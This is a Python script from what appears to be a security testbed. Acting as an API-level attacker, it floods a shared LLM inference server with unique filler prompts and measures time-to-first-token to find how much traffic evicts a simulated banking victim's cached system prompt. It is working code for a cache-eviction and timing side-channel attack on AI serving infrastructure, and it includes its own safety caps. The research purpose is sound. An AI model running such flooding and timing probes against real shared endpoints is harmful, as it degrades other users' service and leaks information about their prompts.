"""Phase 1/2/3: empirically find this testbed's KV-cache eviction threshold
from TTFT alone -- purely as the API-level attacker (no server GPU/power
visibility, no privileged access). How much genuinely novel filler content
does it take to knock the victim's (banking_sim's) system-prompt entry out
of the shared cache?

Reuses attacker_probe.probe's KNOWN_VICTIM_SYSTEM_PROMPT (the fixed,
tracked "victim" prefix) and probe_once (the already-validated streaming
TTFT measurement) rather than rebuilding them -- per the Phase 0 finding
that this tooling already exists on this machine.

Protocol:
  1. Fire the victim prompt once -> warm baseline TTFT.
  2. Fire filler prompts in batches (--batch-size each); each filler is
     unique, never-before-seen content, so the very first filler fired is
     itself a legitimate cold-fire TTFT reference (no separate cold
     measurement needed). --concurrency controls whether each batch fires
     sequentially (1, the default -- cumulative-volume mechanism) or as
     concurrent in-flight waves (>1 -- concurrent-pressure mechanism).
  3. After each batch, re-fire the victim. Declare eviction once its TTFT
     crosses the midpoint between the warm baseline and the first
     cold-fire reference, confirmed by one immediate re-check (guards
     against a single noisy sample flipping the verdict).
  4. Stop immediately on confirmed eviction. Hard-capped by --max-batches
     regardless (no open-ended flooding).

Every request's server-reported `created` epoch (from the response body,
not a client-side clock read) is captured and logged, so runs can be
correlated against external timing/telemetry after the fact.
"""

import argparse
import asyncio
import random
import time
import uuid
from datetime import datetime, timezone

import httpx

from attacker_probe.probe import KNOWN_VICTIM_SYSTEM_PROMPT, probe_once
from banking_sim.config import load_config_file, resolve
from banking_sim.logger import JsonlLogger

# A varied word pool so every filler prompt is a fresh, non-repeating
# sequence -- avoids padding with one repeated phrase, which could
# tokenize/cache differently from genuinely novel content.
_WORD_POOL = (
    "system network protocol latency throughput packet router switch "
    "gateway firmware kernel process thread memory cache buffer stack "
    "queue socket stream cipher token session cookie header payload "
    "endpoint cluster shard replica quorum ledger audit invoice receipt "
    "vendor supplier contract clause statute regulation compliance policy "
    "quarter forecast budget revenue expense margin equity asset liability "
    "harbor voyage cargo manifest customs tariff border checkpoint patrol "
    "orchard harvest irrigation drought reservoir aquifer sediment erosion "
    "canyon plateau ridge summit glacier tundra prairie wetland estuary "
    "reactor turbine generator transformer capacitor resistor inductor "
    "circuit voltage current resistance frequency amplitude wavelength "
    "spectrum isotope neutron proton electron molecule enzyme protein "
    "genome mutation allele chromosome organism habitat ecosystem biome "
    "sonnet ballad prologue epilogue chapter verse stanza metaphor irony "
    "quartet symphony concerto sonata rehearsal ensemble conductor tempo"
).split()


def build_filler_content(rng: random.Random, target_words: int) -> str:
    """Genuinely novel per call: random word sequence + a UUID nonce, so
    it can never repeat or collide with any prior filler, victim, or
    cold-baseline content used anywhere in this project."""
    nonce = uuid.uuid4().hex
    words = rng.choices(_WORD_POOL, k=target_words)
    return f"nonce-{nonce} " + " ".join(words)


def created_to_utc(created):
    return datetime.fromtimestamp(created, tz=timezone.utc).isoformat() if created else None


async def fire(client, args, content, timeout):
    return await probe_once(client, args.base_url, args.model, args.api_key, content, timeout=timeout)


async def fire_wave(client, args, rng, wave_size):
    """Fire `wave_size` unique filler requests concurrently (wave_size=1
    degenerates to a plain single await -- same as sequential firing)."""
    contents = [build_filler_content(rng, args.filler_words) for _ in range(wave_size)]
    return await asyncio.gather(*[fire(client, args, c, args.request_timeout) for c in contents])


async def run_phase2(args: argparse.Namespace) -> dict:
    logger = JsonlLogger(args.output)
    rng = random.Random()
    run_start = time.perf_counter()

    def log_row(kind, batch, cum_filler_count, cum_filler_tokens, ttft_ms, prompt_tokens, created):
        logger.log({
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "kind": kind,
            "batch": batch,
            "cumulative_filler_count": cum_filler_count,
            "cumulative_filler_tokens": cum_filler_tokens,
            "ttft_ms": round(ttft_ms, 2),
            "prompt_tokens": prompt_tokens,
            "created_epoch": created,
            "created_utc": created_to_utc(created),
            "elapsed_run_seconds": round(time.perf_counter() - run_start, 2),
        })

    result = {}
    try:
        async with httpx.AsyncClient() as client:
            # Warm-up (untracked/not part of the official record): if the
            # victim hasn't been fired in a while its entry may have gone
            # cold from disuse, which would contaminate step 1's baseline.
            for i in range(args.warmup_fires):
                wttft, wtok, wcreated = await fire(client, args, KNOWN_VICTIM_SYSTEM_PROMPT, args.request_timeout)
                log_row("victim_warmup", 0, 0, 0, wttft, wtok, wcreated)
                print(f"[phase2] warmup fire {i+1}/{args.warmup_fires}: victim TTFT={wttft:.1f}ms")

            # Step 1: warm baseline (official).
            baseline_ttft, baseline_tokens, baseline_created = await fire(client, args, KNOWN_VICTIM_SYSTEM_PROMPT, args.request_timeout)
            log_row("victim_baseline", 0, 0, 0, baseline_ttft, baseline_tokens, baseline_created)
            print(f"[phase2] warm baseline: victim TTFT={baseline_ttft:.1f}ms ({baseline_tokens} prompt tokens) at {created_to_utc(baseline_created)}")

            cold_ref_ttft = None
            total_filler_count = 0
            total_filler_tokens = 0
            flood_start_created = None
            flood_end_created = None
            evicted = False
            batch = 0
            final_victim_ttft, final_victim_created = None, None

            while not evicted and batch < args.max_batches:
                batch += 1
                remaining = args.batch_size
                while remaining > 0:
                    wave_size = min(args.concurrency, remaining)
                    wave_results = await fire_wave(client, args, rng, wave_size)
                    for ttft, tokens, created in wave_results:
                        total_filler_count += 1
                        total_filler_tokens += tokens or 0
                        if created is not None:
                            flood_start_created = created if flood_start_created is None else min(flood_start_created, created)
                            flood_end_created = created if flood_end_created is None else max(flood_end_created, created)
                        if cold_ref_ttft is None:
                            cold_ref_ttft = ttft  # first filler fired = legitimate cold-fire reference
                            print(f"[phase2] first cold-fire reference: {cold_ref_ttft:.1f}ms")
                        log_row("filler", batch, total_filler_count, total_filler_tokens, ttft, tokens, created)
                    remaining -= wave_size

                victim_ttft, victim_tokens, victim_created = await fire(client, args, KNOWN_VICTIM_SYSTEM_PROMPT, args.request_timeout)
                log_row("victim_recheck", batch, total_filler_count, total_filler_tokens, victim_ttft, victim_tokens, victim_created)
                final_victim_ttft, final_victim_created = victim_ttft, victim_created

                midpoint = (baseline_ttft + cold_ref_ttft) / 2.0
                print(
                    f"[phase2] after batch {batch}: {total_filler_count} filler reqs / "
                    f"{total_filler_tokens} filler tokens -> victim TTFT={victim_ttft:.1f}ms "
                    f"(warm={baseline_ttft:.1f}ms, cold_ref={cold_ref_ttft:.1f}ms, midpoint={midpoint:.1f}ms)"
                )

                if victim_ttft >= midpoint:
                    confirm_ttft, confirm_tokens, confirm_created = await fire(client, args, KNOWN_VICTIM_SYSTEM_PROMPT, args.request_timeout)
                    log_row("victim_confirm", batch, total_filler_count, total_filler_tokens, confirm_ttft, confirm_tokens, confirm_created)
                    print(f"[phase2] confirmation re-check: victim TTFT={confirm_ttft:.1f}ms")
                    final_victim_ttft, final_victim_created = confirm_ttft, confirm_created
                    if confirm_ttft >= midpoint:
                        evicted = True
                        print(
                            f"[phase2] EVICTION CONFIRMED after {total_filler_count} filler requests "
                            f"({total_filler_tokens} filler tokens) across {batch} batches."
                        )

            if not evicted:
                print(
                    f"[phase2] STOPPED at --max-batches={args.max_batches} "
                    f"({total_filler_count} filler requests, {total_filler_tokens} filler tokens) "
                    f"without confirmed eviction."
                )

            result = {
                "evicted": evicted,
                "concurrency": args.concurrency,
                "batches": batch,
                "total_filler_requests": total_filler_count,
                "total_filler_tokens": total_filler_tokens,
                "warm_baseline_ttft_ms": baseline_ttft,
                "cold_ref_ttft_ms": cold_ref_ttft,
                "final_victim_ttft_ms": final_victim_ttft,
                "timestamps_utc": {
                    "baseline_fire": created_to_utc(baseline_created),
                    "flood_start": created_to_utc(flood_start_created),
                    "flood_end": created_to_utc(flood_end_created),
                    "victim_refire": created_to_utc(final_victim_created),
                },
                "timestamps_epoch": {
                    "baseline_fire": baseline_created,
                    "flood_start": flood_start_created,
                    "flood_end": flood_end_created,
                    "victim_refire": final_victim_created,
                },
            }
    finally:
        logger.close()

    return result


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--config", default=None)
    parser.add_argument("--base-url", default=None)
    parser.add_argument("--model", default=None)
    parser.add_argument("--api-key", default=None)
    parser.add_argument("--request-timeout", type=float, default=30.0)
    parser.add_argument("--batch-size", type=int, default=25)
    parser.add_argument("--concurrency", type=int, default=1, help="In-flight filler requests per wave (1 = sequential).")
    parser.add_argument("--warmup-fires", type=int, default=5, help="Untracked victim re-fires before the official baseline, to undo disuse-cooling.")
    parser.add_argument("--filler-words", type=int, default=200)
    parser.add_argument("--max-batches", type=int, default=20, help="Hard cap; no open-ended flooding.")
    parser.add_argument("--output", default="runs/eviction_threshold.jsonl")
    args = parser.parse_args()

    config = load_config_file(args.config)
    args.base_url = resolve("base_url", args.base_url, config)
    args.model = resolve("model", args.model, config)
    args.api_key = resolve("api_key", args.api_key, config)
    return args


def main() -> None:
    args = parse_args()
    result = asyncio.run(run_phase2(args))
    print("\n[phase2] result:", result)


if __name__ == "__main__":
    main()
